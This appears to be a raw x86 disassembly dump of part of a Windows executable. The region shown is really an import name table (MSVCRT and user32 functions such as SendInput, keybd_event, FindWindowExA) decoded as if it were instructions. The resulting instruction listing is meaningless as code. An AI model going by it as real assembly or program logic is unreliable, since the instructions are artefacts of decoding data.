  412800:	pop    edx
  412801:	xor    al,0x1
  412803:	add    BYTE PTR [esi+0x34],ch
  412806:	add    DWORD PTR [eax],eax
  412808:	xchg   BYTE PTR [ecx+eax*1],dh
  41280b:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  412812:	add    DWORD PTR [eax],eax
  412814:	mov    dl,0x34
  412816:	add    DWORD PTR [eax],eax
  412818:	enter  0x134,0x0
  41281c:	fidiv  DWORD PTR [ecx+eax*1]
  41281f:	add    dh,ah
  412821:	xor    al,0x1
  412823:	add    dl,bh
  412825:	xor    al,0x1
  412827:	add    BYTE PTR [esi*1+0x350e0001],al
  41282e:	add    DWORD PTR [eax],eax
  412830:	push   ds
  412831:	xor    eax,0x35360001
  412836:	add    DWORD PTR [eax],eax
  412838:	dec    edx
  412839:	xor    eax,0x355a0001
  41283e:	add    DWORD PTR [eax],eax
  412840:	xor    ax,0x1
  412844:	je     0x41287b
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    dh,BYTE PTR ds:0x359c0001
  41284e:	add    DWORD PTR [eax],eax
  412850:	add    BYTE PTR [eax],al
  412852:	add    BYTE PTR [eax],al
  412854:	mov    edx,0xce000135
  412859:	xor    eax,0x35e00001
  41285e:	add    DWORD PTR [eax],eax
  412860:	in     al,dx
  412861:	xor    eax,0x36040001
  412866:	add    DWORD PTR [eax],eax
  412868:	adc    al,0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	sub    BYTE PTR [esi],dh
  41286e:	add    DWORD PTR [eax],eax
  412870:	ds add DWORD PTR ss:[eax],eax
  412874:	dec    esi
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	pusha  
  412879:	add    DWORD PTR ss:[eax],eax
  41287c:	ins    BYTE PTR es:[edi],dx
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	xor    BYTE PTR [esi],0x1
  412883:	add    BYTE PTR [esi-0x49fffeca],bl
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	retf   0x136
  41288f:	add    dl,bl
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	out    0x36,al
  412896:	add    DWORD PTR [eax],eax
  412898:	(bad)  
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	adc    BYTE PTR [edi],dh
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	and    dh,BYTE PTR [edi]
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	xor    dh,BYTE PTR [edi]
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	inc    esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	push   eax
  4128ad:	aaa    
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	pusha  
  4128b1:	aaa    
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	outs   dx,BYTE PTR ds:[esi]
  4128b5:	aaa    
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	js     0x4128f1
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    BYTE PTR [edi],dh
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	xchg   esi,eax
  4128c1:	aaa    
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	test   al,0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	mov    esi,0xd2000137
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jmp    0x138:0x137
  4128d7:	add    BYTE PTR [esi],cl
  4128d9:	cmp    BYTE PTR [ecx],al
  4128db:	add    BYTE PTR [esi],ah
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1],bh
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	dec    esp
  4128e5:	cmp    BYTE PTR [ecx],al
  4128e7:	add    BYTE PTR [eax+0x38],bl
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	jo     0x412926
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	jle    0x41292a
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	xchg   edx,eax
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [esi-0x51fffec8],bl
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dh,al
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    dl,bl
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    al,ch
  412909:	cmp    BYTE PTR [ecx],al
  41290b:	add    dh,bh
  41290d:	cmp    BYTE PTR [ecx],al
  41290f:	add    BYTE PTR [edx],dl
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [esi],bl
  412915:	cmp    DWORD PTR [ecx],eax
  412917:	add    BYTE PTR [eax],bh
  412919:	cmp    DWORD PTR [ecx],eax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412923:	add    BYTE PTR [edx+0x39],dh
  412926:	add    DWORD PTR [eax],eax
  412928:	add    BYTE PTR [eax],al
  41292a:	add    BYTE PTR [eax],al
  41292c:	xchg   edi,eax
  41292d:	add    ebp,DWORD PTR [ecx+0x73]
  412930:	imul   esp,DWORD PTR fs:[edi+0x69],0x41f0074
  412938:	ja     0x41299d
  41293a:	jae    0x41299f
  41293c:	ins    DWORD PTR es:[edi],dx
  41293d:	jo     0x41293f
  41293f:	add    ch,dh
  412941:	add    BYTE PTR [edi+0x63],bl
  412944:	outs   dx,DWORD PTR ds:[esi]
  412945:	outs   dx,BYTE PTR ds:[esi]
  412946:	je     0x4129ba
  412948:	outs   dx,DWORD PTR ds:[esi]
  412949:	ins    BYTE PTR es:[edi],dx
  41294a:	data16 jo 0x41294d
  41294d:	add    BYTE PTR [ebp+0x74656703],cl
  412953:	outs   dx,BYTE PTR gs:[esi]
  412955:	jbe    0x412957
  412957:	add    BYTE PTR ds:0x73637704,ch
  41295d:	jb     0x4129c2
  41295f:	push   0x3f20072
  412964:	jae    0x4129da
  412966:	jb     0x4129d6
  412968:	arpl   WORD PTR [eax+0x79],si
  41296b:	add    al,ch
  41296d:	add    esi,DWORD PTR [ebx+0x74]
  412970:	jb     0x4129d5
  412972:	jo     0x4129ed
  412974:	add    BYTE PTR [eax],al
  412976:	mov    bl,0x0
  412978:	pop    edi
  412979:	pop    edi
  41297a:	jae    0x4129e1
  41297c:	je     0x4129dd
  41297e:	popa   
  41297f:	jo     0x4129f1
  412981:	pop    edi
  412982:	je     0x4129fd
  412984:	jo     0x4129eb
  412986:	add    BYTE PTR [eax],al
  412988:	lds    eax,FWORD PTR [ebx]
  41298a:	jo     0x4129fe
  41298c:	imul   ebp,DWORD PTR [esi+0x74],0xcc000066
  412993:	add    esi,DWORD PTR [ecx+0x73]
  412996:	outs   dx,DWORD PTR ds:[esi]
  412997:	jb     0x412a0d
  412999:	add    BYTE PTR [edx+0x3],dh
  41299c:	data16 ins BYTE PTR es:[edi],dx
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	outs   dx,DWORD PTR ds:[esi]
  4129a0:	jb     0x4129a2
  4129a2:	lods   al,BYTE PTR ds:[esi]
  4129a3:	add    ebp,DWORD PTR [ecx+0x73]
  4129a6:	js     0x412a0c
  4129a8:	imul   esp,DWORD PTR [edi+0x69],0xa0000074
  4129af:	add    BYTE PTR [edi+0x5f],bl
  4129b2:	jo     0x412a13
  4129b4:	pop    edi
  4129b5:	ins    WORD PTR es:[edi],dx
  4129b7:	outs   dx,DWORD PTR ds:[esi]
  4129b8:	fs add BYTE PTR gs:[eax],al
  4129bc:	xor    eax,0x73637704
  4129c1:	je     0x412a32
  4129c3:	ins    BYTE PTR es:[edi],dx
  4129c4:	add    BYTE PTR [eax],al
  4129c6:	or     al,0x4
  4129c8:	je     0x412a39
  4129ca:	ja     0x412a41
  4129cc:	jo     0x412a3e
  4129ce:	gs jb  0x4129d1
  4129d1:	add    cl,dh
  4129d3:	add    esi,DWORD PTR [ebx+0x74]
  4129d6:	jb     0x412a46
  4129d8:	arpl   WORD PTR [ebp+0x70],bp
  4129db:	add    BYTE PTR [ebx+0x705f5f00],bl
  4129e1:	pop    edi
  4129e2:	pop    edi
  4129e3:	arpl   WORD PTR [edi+0x6d],bp
  4129e6:	ins    DWORD PTR es:[edi],dx
  4129e7:	outs   dx,DWORD PTR ds:[esi]
  4129e8:	fs add BYTE PTR gs:[eax],al
  4129ec:	push   es
  4129ed:	add    al,0x74
  4129ef:	imul   ebp,DWORD PTR [ebp+0x65],0x38b0000
  4129f6:	addr16 gs je 0x412a5d
  4129fa:	add    BYTE PTR [eax],al
  4129fc:	xor    eax,DWORD PTR [edi+esi*2]
  4129ff:	arpl   WORD PTR [ebx+0x74],si
  412a02:	outs   dx,DWORD PTR ds:[esi]
  412a03:	imul   eax,DWORD PTR [eax],0x0
  412a06:	test   eax,0x77736903
  412a0b:	jae    0x412a7d
  412a0d:	popa   
  412a0e:	arpl   WORD PTR [ebp+0x0],sp
  412a11:	add    BYTE PTR [ebx+0x77736903],ch
  412a17:	js     0x412a7d
  412a19:	imul   esp,DWORD PTR [edi+0x69],0xdb0074
  412a20:	pop    edi
  412a21:	popa   
  412a22:	ins    DWORD PTR es:[edi],dx
  412a23:	jae    0x412a8c
  412a25:	pop    edi
  412a26:	gs js  0x412a92
  412a29:	je     0x412a2b
  412a2b:	add    BYTE PTR [ecx],ah
  412a2d:	add    al,0x77
  412a2f:	arpl   WORD PTR [ebx+0x63],si
  412a32:	jo     0x412aad
  412a34:	add    BYTE PTR [eax],al
  412a36:	xchg   BYTE PTR [ecx],al
  412a38:	pop    edi
  412a39:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  412a40:	ins    DWORD PTR es:[edi],dx
  412a41:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  412a48:	outs   dx,BYTE PTR ds:[esi]
  412a49:	jne    0x412ab8
  412a4b:	add    ch,dh
  412a4d:	add    esi,DWORD PTR [ebx+0x74]
  412a50:	jb     0x412ac2
  412a52:	bound  esi,QWORD PTR [edx+0x6b]
  412a55:	add    BYTE PTR [esi+0x73695f01],bl
  412a5b:	ins    DWORD PTR es:[edi],dx
  412a5c:	bound  esp,QWORD PTR [edx+0x6c]
  412a5f:	gs popa 
  412a61:	add    BYTE PTR fs:[eax],al
  412a64:	sbb    BYTE PTR [esi+esi*2],al
  412a67:	jae    0x412ae0
  412a69:	jo     0x412add
  412a6b:	imul   ebp,DWORD PTR [esi+0x74],0x36d0066
  412a72:	data16 addr16 gs je 0x412ada
  412a77:	add    BYTE PTR [edx+0x0],dl
  412a7a:	pop    edi
  412a7b:	pop    eax
  412a7c:	arpl   WORD PTR [eax+0x74],si
  412a7f:	inc    esi
  412a80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4290072
  412a88:	ja     0x412aed
  412a8a:	jae    0x412afa
  412a8c:	arpl   WORD PTR [eax+0x79],si
  412a8f:	add    BYTE PTR [ebx],ah
  412a91:	add    DWORD PTR [edi+0x65],ebx
  412a94:	js     0x412aff
  412a96:	je     0x412a98
  412a98:	imul   eax,DWORD PTR [ebx],0x6f6c6366
  412a9e:	jae    0x412b05
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	call   0x65a489a7
  412aa7:	js     0x412b12
  412aa9:	je     0x412aab
  412aab:	add    bh,al
  412aad:	add    esi,DWORD PTR [eax+0x75]
  412ab0:	je     0x412b15
  412ab2:	add    BYTE PTR [eax],al
  412ab4:	fadd   DWORD PTR [ebx]
  412ab6:	jae    0x412b1d
  412ab8:	je     0x412b26
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	arpl   WORD PTR [ecx+0x6c],sp
  412abe:	add    BYTE PTR gs:[ebp+0x735f5f00],dh
  412ac5:	gs je  0x412b3d
  412ac8:	jae    0x412b2f
  412aca:	jb     0x412b39
  412acc:	popa   
  412acd:	je     0x412b37
  412acf:	gs jb  0x412b44
  412ad2:	add    BYTE PTR [eax],al
  412ad4:	mov    BYTE PTR [ebx],al
  412ad6:	data16 ja 0x412b4b
  412ad9:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7003c300
  412ae1:	gs jb  0x412b56
  412ae4:	outs   dx,DWORD PTR ds:[esi]
  412ae5:	jb     0x412ae7
  412ae7:	add    BYTE PTR [edx+0x3],bl
  412aea:	popa   
  412aeb:	je     0x412b5c
  412aed:	ins    BYTE PTR es:[edi],dx
  412aee:	add    BYTE PTR [eax],al
  412af0:	jb     0x412af2
  412af2:	pop    edi
  412af3:	pop    edi
  412af4:	addr16 gs je 0x412b65
  412af8:	popa   
  412af9:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b00:	sub    BYTE PTR [edi+esi*2],al
  412b03:	arpl   WORD PTR [ebx+0x6e],si
  412b06:	arpl   WORD PTR [ebp+0x70],bp
  412b09:	add    dl,dl
  412b0b:	add    esi,DWORD PTR [edx+0x65]
  412b0e:	ins    DWORD PTR es:[edi],dx
  412b0f:	outs   dx,DWORD PTR ds:[esi]
  412b10:	jbe    0x412b77
  412b12:	add    BYTE PTR [eax],al
  412b14:	dec    ebp
  412b15:	push   ebx
  412b16:	push   esi
  412b17:	inc    ebx
  412b18:	push   edx
  412b19:	push   esp
  412b1a:	cs fs ins BYTE PTR es:[edi],dx
  412b1d:	ins    BYTE PTR es:[edi],dx
  412b1e:	add    BYTE PTR [eax],al
  412b20:	mov    edi,0x636f4c01
  412b25:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412b29:	outs   dx,DWORD PTR fs:[esi]
  412b2b:	ja     0x412b82
  412b2d:	jo     0x412b93
  412b2f:	popa   
  412b30:	je     0x412b97
  412b32:	add    BYTE PTR [eax],al
  412b34:	nop
  412b35:	add    dl,BYTE PTR [edx+esi*2+0x61]
  412b39:	arpl   WORD PTR [ebx+0x50],bp
  412b3c:	outs   dx,DWORD PTR ds:[esi]
  412b3d:	jo     0x412bb4
  412b3f:	jo     0x412b8e
  412b41:	outs   dx,BYTE PTR gs:[esi]
  412b43:	jne    0x412b45
  412b45:	add    BYTE PTR [eax],bh
  412b47:	add    dl,BYTE PTR [ebx+0x65]
  412b4a:	je     0x412b8f
  412b4c:	jne    0x412bc0
  412b4e:	jae    0x412bbf
  412b50:	jb     0x412b52
  412b52:	mov    eax,ds:0x57734901
  412b57:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412b5e:	popa   
  412b5f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412b63:	add    BYTE PTR [ecx+0x536e4901],al
  412b69:	outs   dx,BYTE PTR gs:[esi]
  412b6b:	fs dec ebp
  412b6d:	gs jae 0x412be3
  412b70:	popa   
  412b71:	addr16 gs inc ebp
  412b74:	js     0x412b76
  412b76:	xchg   ebx,eax
  412b77:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412b7b:	je     0x412bef
  412b7d:	outs   dx,DWORD PTR ds:[esi]
  412b7e:	jns    0x412bc1
  412b80:	arpl   WORD PTR [ebx+0x65],sp
  412b83:	ins    BYTE PTR es:[edi],dx
  412b84:	gs jb  0x412be8
  412b87:	je     0x412bf8
  412b89:	jb     0x412bdf
  412b8b:	popa   
  412b8c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b90:	adc    eax,DWORD PTR [ecx]
  412b92:	inc    edi
  412b93:	gs je  0x412bda
  412b96:	outs   dx,DWORD PTR ds:[esi]
  412b97:	jne    0x412bfb
  412b99:	ins    BYTE PTR es:[edi],dx
  412b9a:	gs inc ebx
  412b9c:	ins    BYTE PTR es:[edi],dx
  412b9d:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412ba4:	add    BYTE PTR [eax],al
  412ba6:	mov    ds:0x57734901,eax
  412bab:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  412bb2:	jae    0x412c1d
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	mov    al,0x1
  412bba:	dec    esp
  412bbb:	outs   dx,DWORD PTR ds:[esi]
  412bbc:	popa   
  412bbd:	fs dec ecx
  412bbf:	arpl   WORD PTR [edi+0x6e],bp
  412bc2:	push   edi
  412bc3:	add    BYTE PTR [ebp+0x79656b02],bh
  412bc9:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  412bcd:	jbe    0x412c34
  412bcf:	outs   dx,BYTE PTR ds:[esi]
  412bd0:	je     0x412bd2
  412bd2:	test   eax,0x616f4c01
  412bd7:	fs inc edx
  412bd9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x58004170
  412be1:	add    dl,BYTE PTR [ebx+0x65]
  412be4:	je     0x412c38
  412be6:	arpl   WORD PTR gs:[eax+eax*1-0x1e],si
  412beb:	add    BYTE PTR [esi+0x69],al
  412bee:	outs   dx,BYTE PTR ds:[esi]
  412bef:	fs push edi
  412bf1:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412bf8:	inc    ecx
  412bf9:	add    cl,bh
  412bfb:	add    BYTE PTR [edi+0x65],al
  412bfe:	je     0x412c43
  412c00:	ins    BYTE PTR es:[edi],dx
  412c01:	popa   
  412c02:	jae    0x412c77
  412c04:	dec    esp
  412c05:	outs   dx,DWORD PTR ds:[esi]
  412c06:	outs   dx,BYTE PTR ds:[esi]
  412c07:	addr16 push edi
  412c09:	add    BYTE PTR ds:0x6e655302,ah
  412c0f:	fs dec ecx
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	jo     0x412c89
  412c14:	je     0x412c16
  412c16:	cdq    
  412c17:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412c1b:	ins    BYTE PTR es:[edi],dx
  412c1c:	outs   dx,DWORD PTR ds:[esi]
  412c1d:	addr16 inc edx
  412c1f:	outs   dx,DWORD PTR ds:[esi]
  412c20:	js     0x412c6b
  412c22:	outs   dx,BYTE PTR ds:[esi]
  412c23:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	inc    ecx
  412c2f:	add    BYTE PTR [edi+0x70737702],bh
  412c35:	jb     0x412ca0
  412c37:	outs   dx,BYTE PTR ds:[esi]
  412c38:	je     0x412ca0
  412c3a:	inc    ecx
  412c3b:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  412c42:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x654700f8
  412c4a:	je     0x412c8f
  412c4c:	ins    BYTE PTR es:[edi],dx
  412c4d:	popa   
  412c4e:	jae    0x412cc3
  412c50:	dec    esp
  412c51:	outs   dx,DWORD PTR ds:[esi]
  412c52:	outs   dx,BYTE PTR ds:[esi]
  412c53:	addr16 inc ecx
  412c55:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  412c5c:	outs   dx,DWORD PTR ds:[esi]
  412c5d:	outs   dx,BYTE PTR ds:[esi]
  412c5e:	imul   esp,DWORD PTR [ebx+0x0],0x47014200
  412c65:	gs je  0x412cb6
  412c68:	gs js  0x412cdf
  412c6b:	inc    esp
  412c6c:	ins    BYTE PTR es:[edi],dx
  412c6d:	addr16 inc edi
  412c6f:	jb     0x412ce0
  412c71:	jne    0x412ce3
  412c73:	dec    ecx
  412c74:	je     0x412cdb
  412c76:	ins    DWORD PTR es:[edi],dx
  412c77:	add    BYTE PTR [ebx+0x61724400],dh
  412c7d:	ja     0x412cc8
  412c7f:	arpl   WORD PTR [edi+0x6e],bp
  412c82:	add    BYTE PTR [eax],al
  412c84:	jmp    0x65b17b8a
  412c89:	outs   dx,BYTE PTR ds:[esi]
  412c8a:	dec    ecx
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	jo     0x412d03
  412c8e:	je     0x412cd4
  412c90:	gs jae 0x412cfe
  412c93:	je     0x412d04
  412c95:	jo     0x412c97
  412c97:	add    dh,bh
  412c99:	add    BYTE PTR [edi+0x65],al
  412c9c:	je     0x412ce1
  412c9e:	ins    BYTE PTR es:[edi],dx
  412c9f:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412ca6:	jb     0x412ca8
  412ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca9:	add    DWORD PTR [ecx+0x73],ecx
  412cac:	pop    edx
  412cad:	outs   dx,DWORD PTR ds:[esi]
  412cae:	outs   dx,DWORD PTR ds:[esi]
  412caf:	ins    DWORD PTR es:[edi],dx
  412cb0:	gs add BYTE PTR fs:[eax],al
  412cb4:	rol    DWORD PTR [eax],0x45
  412cb7:	outs   dx,BYTE PTR ds:[esi]
  412cb8:	popa   
  412cb9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cbd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412cc4:	sub    BYTE PTR [eax],al
  412cc6:	inc    ebx
  412cc7:	push   0x6f4c7261
  412ccc:	ja     0x412d33
  412cce:	jb     0x412d12
  412cd0:	jne    0x412d38
  412cd2:	push   di
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	inc    ebx
  412cd7:	add    BYTE PTR [ebx+0x6c],al
  412cda:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  412ce1:	arpl   WORD PTR [edx+0x65],si
  412ce4:	outs   dx,BYTE PTR gs:[esi]
  412ce6:	add    BYTE PTR [eax],al
  412ce8:	add    eax,DWORD PTR [eax]
  412cea:	inc    ecx
  412ceb:	fs push 0x75
  412cee:	jae    0x412d64
  412cf0:	push   edi
  412cf1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412cf8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412cfc:	add    BYTE PTR [eax],al
  412cfe:	icebp  
  412cff:	add    DWORD PTR [eax+0x6f],edx
  412d02:	jae    0x412d78
  412d04:	dec    ebp
  412d05:	gs jae 0x412d7b
  412d08:	popa   
  412d09:	addr16 gs inc ecx
  412d0c:	add    BYTE PTR [eax],al
  412d0e:	out    dx,al
  412d0f:	add    DWORD PTR [eax+0x65],edx
  412d12:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412d17:	jae    0x412d7a
  412d19:	addr16 gs inc ecx
  412d1c:	add    BYTE PTR [eax],al
  412d1e:	dec    ebx
  412d1f:	add    DWORD PTR [edi+0x65],eax
  412d22:	je     0x412d74
  412d24:	jb     0x412d95
  412d26:	jo     0x412d7f
  412d28:	add    BYTE PTR [eax],al
  412d2a:	inc    esi
  412d2b:	add    BYTE PTR [ebx+0x6c],al
  412d2e:	outs   dx,DWORD PTR ds:[esi]
  412d2f:	jae    0x412d96
  412d31:	inc    esp
  412d32:	gs jae 0x412da0
  412d35:	je     0x412da6
  412d37:	jo     0x412d39
  412d39:	add    cl,cl
  412d3b:	add    DWORD PTR [ebp+0x61],ecx
  412d3e:	jo     0x412d97
  412d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412d47:	imul   ebp,DWORD PTR [esi+0x74],0x2020073
  412d4e:	push   edx
  412d4f:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  412d58:	popa   
  412d59:	jae    0x412dce
  412d5b:	inc    ecx
  412d5c:	add    BYTE PTR [eax],al
  412d5e:	mov    es,WORD PTR [ecx]
  412d60:	dec    ecx
  412d61:	jae    0x412da6
  412d63:	push   0x6c417261
  412d68:	jo     0x412dd2
  412d6a:	popa   
  412d6b:	dec    esi
  412d6c:	jne    0x412ddb
  412d6e:	gs jb  0x412dda
  412d71:	arpl   WORD PTR [edi+0x0],dx
  412d74:	mov    cl,0x1
  412d76:	dec    esp
  412d77:	outs   dx,DWORD PTR ds:[esi]
  412d78:	popa   
  412d79:	fs dec ecx
  412d7b:	ins    DWORD PTR es:[edi],dx
  412d7c:	popa   
  412d7d:	addr16 gs inc ecx
  412d80:	add    BYTE PTR [eax],al
  412d82:	sahf   
  412d83:	add    DWORD PTR [ecx+0x73],ecx
  412d86:	push   edx
  412d87:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412d8c:	jo     0x412e02
  412d8e:	jns    0x412d90
  412d90:	mov    es,WORD PTR [edx]
  412d92:	push   esp
  412d93:	outs   dx,DWORD PTR ds:[esi]
  412d94:	push   ebp
  412d95:	outs   dx,BYTE PTR ds:[esi]
  412d96:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412d9d:	add    BYTE PTR [ebx],bh
  412d9f:	add    DWORD PTR [edi+0x65],eax
  412da2:	je     0x412df1
  412da4:	gs jae 0x412e1a
  412da7:	popa   
  412da8:	addr16 gs inc ebp
  412dab:	js     0x412e21
  412dad:	jb     0x412e10
  412daf:	dec    ecx
  412db0:	outs   dx,BYTE PTR ds:[esi]
  412db1:	outs   dx,WORD PTR ds:[esi]
  412db3:	add    BYTE PTR [ebp+0x1],al
  412db6:	inc    edi
  412db7:	gs je  0x412e0a
  412dba:	popa   
  412dbb:	jb     0x412e22
  412dbd:	outs   dx,BYTE PTR ds:[esi]
  412dbe:	je     0x412dc0
  412dc0:	bound  eax,QWORD PTR [eax]
  412dc2:	inc    ebx
  412dc3:	jb     0x412e2a
  412dc5:	popa   
  412dc6:	je     0x412e2d
  412dc8:	push   edi
  412dc9:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412dd0:	inc    ecx
  412dd1:	add    BYTE PTR [ecx+0x766e4901],cl
  412dd7:	popa   
  412dd8:	ins    BYTE PTR es:[edi],dx
  412dd9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412de1:	je     0x412de3
  412de3:	add    BYTE PTR [ebp+0x2],ch
  412de6:	push   ebx
  412de7:	gs je  0x412e41
  412dea:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412df1:	outs   dx,BYTE PTR ds:[esi]
  412df2:	addr16 inc ecx
  412df4:	add    BYTE PTR [eax],al
  412df6:	adc    eax,0x6c655202
  412dfb:	gs popa 
  412dfd:	jae    0x412e64
  412dff:	inc    esp
  412e00:	inc    ebx
  412e01:	add    BYTE PTR [eax+eax*1],ah
  412e04:	inc    ebx
  412e05:	push   0x65676e61
  412e0a:	dec    ebp
  412e0b:	outs   dx,BYTE PTR gs:[esi]
  412e0d:	jne    0x412e66
  412e0f:	add    BYTE PTR [ebx],bh
  412e11:	add    BYTE PTR [ebx+0x68],al
  412e14:	arpl   WORD PTR gs:[ebx+0x4d],bp
  412e18:	outs   dx,BYTE PTR gs:[esi]
  412e1a:	jne    0x412e65
  412e1c:	je     0x412e83
  412e1e:	ins    DWORD PTR es:[edi],dx
  412e1f:	add    al,ch
  412e21:	add    DWORD PTR [edi+0x70],ecx
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	dec    ecx
  412e27:	arpl   WORD PTR [edi+0x6e],bp
  412e2a:	add    BYTE PTR [eax],al
  412e2c:	mov    ds:0x57734901,al
  412e31:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412e38:	imul   esp,DWORD PTR [ebx+0x6f],0xce006564
  412e3f:	add    DWORD PTR [ebp+0x65],ecx
  412e42:	jae    0x412eb7
  412e44:	popa   
  412e45:	addr16 gs inc edx
  412e48:	outs   dx,DWORD PTR ds:[esi]
  412e49:	js     0x412e8c
  412e4b:	add    BYTE PTR [ebp+0x61724400],dh
  412e51:	ja     0x412ea0
  412e53:	outs   dx,BYTE PTR gs:[esi]
  412e55:	jne    0x412e99
  412e57:	popa   
  412e58:	jb     0x412e5a
  412e5a:	inc    edx
  412e5b:	add    dl,BYTE PTR [ebx+0x65]
  412e5e:	je     0x412ea6
  412e60:	outs   dx,DWORD PTR ds:[esi]
  412e61:	jb     0x412ec8
  412e63:	addr16 jb 0x412ed5
  412e66:	jne    0x412ed6
  412e68:	fs push edi
  412e6a:	imul   ebp,DWORD PTR [esi+0x64],0xc200776f
  412e71:	add    dh,BYTE PTR [edi+0x76]
  412e74:	jae    0x412ee6
  412e76:	jb     0x412ee1
  412e78:	outs   dx,BYTE PTR ds:[esi]
  412e79:	je     0x412ee1
  412e7b:	push   edi
  412e7c:	add    BYTE PTR [eax],al
  412e7e:	mov    al,ds:0x57734901
  412e83:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412e8a:	push   ebp
  412e8b:	add    DWORD PTR [edi+0x65],eax
  412e8e:	je     0x412ee3
  412e90:	arpl   WORD PTR [edx+0x6f],si
  412e93:	ins    BYTE PTR es:[edi],dx
  412e94:	ins    BYTE PTR es:[edi],dx
  412e95:	push   eax
  412e96:	outs   dx,DWORD PTR ds:[esi]
  412e97:	jae    0x412e99
  412e99:	add    al,dh
  412e9b:	add    BYTE PTR [edi+0x65],al
  412e9e:	je     0x412ee1
  412ea0:	jae    0x412f1b
  412ea2:	outs   dx,BYTE PTR ds:[esi]
  412ea3:	arpl   WORD PTR [ebx+0x65],cx
  412ea6:	jns    0x412efb
  412ea8:	je     0x412f0b
  412eaa:	je     0x412f11
  412eac:	add    BYTE PTR [eax],al
  412eae:	or     eax,0x74654701
  412eb3:	inc    esp
  412eb4:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  412ebb:	jae    0x412f22
  412ebd:	push   ebp
  412ebe:	outs   dx,BYTE PTR ds:[esi]
  412ebf:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x5502a500
  412ec7:	jo     0x412f2d
  412ec9:	popa   
  412eca:	je     0x412f31
  412ecc:	push   edi
  412ecd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412ed4:	or     eax,DWORD PTR [ecx]
  412ed6:	inc    edi
  412ed7:	gs je  0x412f1e
  412eda:	inc    ebx
  412edb:	inc    ebp
  412edc:	js     0x412ede
  412ede:	stos   DWORD PTR es:[edi],eax
  412edf:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412ee3:	fs inc ebx
  412ee5:	jne    0x412f59
